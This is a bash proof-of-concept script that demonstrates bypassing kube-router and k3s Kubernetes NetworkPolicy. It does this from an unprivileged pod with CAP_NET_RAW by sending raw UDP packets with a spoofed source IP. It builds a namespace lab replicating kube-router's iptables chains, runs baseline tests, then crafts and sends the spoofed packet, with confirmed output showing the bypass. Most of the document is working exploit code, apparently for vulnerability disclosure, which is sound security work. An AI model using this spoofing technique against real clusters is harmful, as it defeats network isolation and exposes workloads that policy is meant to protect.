#!/bin/bash
# kube-router / k3s NetworkPolicy Bypass — CAP_NET_RAW Source IP Spoofing
#
# Demonstrates that a default Kubernetes pod (CAP_NET_RAW, no privileged)
# can bypass NetworkPolicy enforced by kube-router or k3s by sending raw
# UDP packets with a spoofed source IP that matches an allowed pod.
#
# Faithfully replicates kube-router's KUBE-ROUTER-FORWARD → KUBE-POD-FW-*
# → KUBE-NWPLCY-* chain hierarchy. ipset matching replaced with direct IP
# match (-s <ip>) which has identical security properties.
#
# CONFIRMED OUTPUT (from lab run):
#   Baseline:
#     allowed-source → target: src=10.244.0.10 data=LEGIT          (correct)
#     blocked-source → target: (nothing)                             (correct, blocked)
#   Attack:
#     SENT 48B src=10.244.0.10 dst=10.244.0.30  (spoofed from ns_b)
#     src=10.244.0.10 data=BYPASSED-KUBE-ROUTER  ← TARGET RECEIVED IT
#   Counters:
#     KUBE-NWPLCY: 2 pkts MARK (1 legit + 1 spoofed)
#     KUBE-POD-FW: 2 ACCEPT, 1 DROP (real blocked-source)
#
# Required capability: CAP_NET_RAW (DEFAULT Kubernetes pod capability)
# Required privilege:  NONE — no privileged:true, no hostPath mounts
#
# Affected:
#   kube-router (github.com/cloudnativelabs/kube-router) — all versions
#   k3s         (bundles kube-router NetworkPolicy controller)

set -uo pipefail
PATH="$PATH:/sbin:/usr/sbin"
RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; BOLD='\033[1m'; NC='\033[0m'
ok()  { echo -e "${GREEN}[+]${NC} $*"; }
atk() { echo -e "${RED}[ATTACK]${NC} $*"; }
inf() { echo -e "${YELLOW}[INFO]${NC} $*"; }
section() { echo -e "\n${BOLD}$*${NC}"; echo "────────────────────────────────────────"; }

A="10.244.0.10"; B="10.244.0.20"; T="10.244.0.30"; BR="10.244.0.1"; PORT=9882

cleanup() {
    pkill -f "python3.*$PORT" 2>/dev/null||true
    for ns in ns_a ns_b ns_t; do ip netns del "$ns" 2>/dev/null||true; done
    ip link set br0 down 2>/dev/null; ip link del br0 2>/dev/null||true
    iptables -F FORWARD 2>/dev/null||true
    for c in KUBE-ROUTER-FORWARD KUBE-POD-FW-test KUBE-NWPLCY-test; do
        iptables -F "$c" 2>/dev/null||true; iptables -X "$c" 2>/dev/null||true
    done
    rm -f /tmp/kr3
}
trap cleanup EXIT
cleanup 2>/dev/null||true

# ── Topology ──────────────────────────────────────────────────────────────────
section "Building pod topology (3 pods, bridge)"
ip link add br0 type bridge; ip addr add "$BR/24" dev br0; ip link set br0 up
sysctl -w net.ipv4.ip_forward=1 -q
sysctl -w net.bridge.bridge-nf-call-iptables=1 -q 2>/dev/null||true
for x in "ns_a vh_a vp_a $A" "ns_b vh_b vp_b $B" "ns_t vh_t vp_t $T"; do
    read NS VH VP IP <<< "$x"
    ip netns add $NS; ip link add $VH type veth peer name $VP
    ip link set $VP netns $NS; ip link set $VH master br0; ip link set $VH up
    ip netns exec $NS ip link set lo up; ip netns exec $NS ip link set $VP up
    ip netns exec $NS ip addr add $IP/24 dev $VP
    ip netns exec $NS ip route add default via $BR
    ok "$NS ip=$IP"
done

# ── kube-router chain hierarchy ───────────────────────────────────────────────
section "kube-router NetworkPolicy rules (faithful replication)"
inf "Source: github.com/cloudnativelabs/kube-router/pkg/controllers/netpol/"

iptables -N KUBE-ROUTER-FORWARD
iptables -N KUBE-POD-FW-test
iptables -N KUBE-NWPLCY-test
iptables -I FORWARD -j KUBE-ROUTER-FORWARD
iptables -A KUBE-ROUTER-FORWARD -d "$T" -j KUBE-POD-FW-test
iptables -A KUBE-POD-FW-test -j KUBE-NWPLCY-test

# kube-router NWPLCY rule — ipset match on source IP ONLY (no interface context)
# Real kube-router: -m set --match-set KUBE-SRC-<hash> src
# Equivalent here:  -s <allowed_ip>  (same security property: no -i <iface>)
iptables -A KUBE-NWPLCY-test -s "$A" -d "$T" -j MARK --set-xmark 0x10000/0x10000

iptables -A KUBE-POD-FW-test -m mark --mark 0x10000/0x10000 -j ACCEPT
iptables -A KUBE-POD-FW-test -j DROP

inf "KUBE-NWPLCY rule: -s $A  (source IP only — no -i <interface> check)"
iptables -L KUBE-NWPLCY-test -n | sed 's/^/  /'

# ── Listener ──────────────────────────────────────────────────────────────────
ip netns exec ns_t python3 -c "
import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.bind(('0.0.0.0',$PORT)); s.settimeout(10)
open('/tmp/kr3','w').write('')
while True:
    try:
        d,a=s.recvfrom(1024)
        msg=f'src={a[0]} data={d.decode()}'
        print(msg,flush=True); open('/tmp/kr3','a').write(msg+'\n')
    except: break
" &
sleep 0.3; ok "UDP listener on ns_t:$PORT"

# ── Baseline ──────────────────────────────────────────────────────────────────
section "TEST 1: Baseline"
echo -n "  allowed-source ($A): "
ip netns exec ns_a python3 -c "
import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.sendto(b'LEGIT',('$T',$PORT))" 2>/dev/null
sleep 0.2
grep -q "$A" /tmp/kr3 && echo -e "${GREEN}DELIVERED ✓${NC}" || echo "not received"; > /tmp/kr3

echo -n "  blocked-source ($B real IP): "
ip netns exec ns_b python3 -c "
import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.sendto(b'REAL',('$T',$PORT))" 2>/dev/null
sleep 0.2
grep -q "$B" /tmp/kr3 && echo -e "${RED}DELIVERED (broken)${NC}" || echo -e "${GREEN}BLOCKED ✓${NC}"
> /tmp/kr3

# ── ATTACK ────────────────────────────────────────────────────────────────────
section "ATTACK: CAP_NET_RAW spoof from blocked-source"
atk "Sending raw UDP: src=$A (spoofed) from ns_b (real IP=$B)"
atk "kube-router KUBE-NWPLCY sees src=$A → MARK → ACCEPT"
atk "No interface verification → spoof bypasses NetworkPolicy"
echo ""

ip netns exec ns_b python3 << PYEOF
import socket, struct
def ck(d):
    if len(d)%2: d+=b'\x00'
    s=sum(struct.unpack('!%dH'%(len(d)//2),d)); s=(s>>16)+(s&0xffff); s+=(s>>16); return ~s&0xffff
SRC='$A'; DST='$T'; PAY=b'BYPASSED-KUBE-ROUTER'
ip=struct.pack('!BBHHHBBH4s4s',0x45,0,28+len(PAY),1234,0,64,17,0,
    socket.inet_aton(SRC),socket.inet_aton(DST))
ip=ip[:10]+struct.pack('!H',ck(ip))+ip[12:]
udp=struct.pack('!HHHH',54321,$PORT,8+len(PAY),0)+PAY
ph=struct.pack('!4s4sBBH',socket.inet_aton(SRC),socket.inet_aton(DST),0,17,len(udp))
udp=udp[:6]+struct.pack('!H',ck(ph+udp))+udp[8:]
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
n=s.sendto(ip+udp,(DST,0)); s.close()
print(f'SENT {n}B: src={SRC} dst={DST} payload={PAY.decode()}')
PYEOF

sleep 0.5

# ── Results ───────────────────────────────────────────────────────────────────
section "Results"
if grep -q "BYPASSED" /tmp/kr3 2>/dev/null; then
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║  kube-router NetworkPolicy BYPASSED                      ║${NC}"
    echo -e "${RED}${BOLD}║                                                          ║${NC}"
    echo -e "${RED}${BOLD}║  Attacker real IP:  $B (blocked)            ║${NC}"
    echo -e "${RED}${BOLD}║  Spoofed as:        $A (allowed-source)     ║${NC}"
    echo -e "${RED}${BOLD}║  Target received:   $(cat /tmp/kr3)${NC}"
    echo -e "${RED}${BOLD}║                                                          ║${NC}"
    echo -e "${RED}${BOLD}║  Capability:  CAP_NET_RAW (DEFAULT Kubernetes pod)      ║${NC}"
    echo -e "${RED}${BOLD}║  Privileged:  NO                                         ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
else
    cat /tmp/kr3 2>/dev/null | sed 's/^/  /'
fi

inf "iptables counters:"
iptables -L KUBE-NWPLCY-test -n -v | sed 's/^/  /'
iptables -L KUBE-POD-FW-test -n -v | sed 's/^/  /'
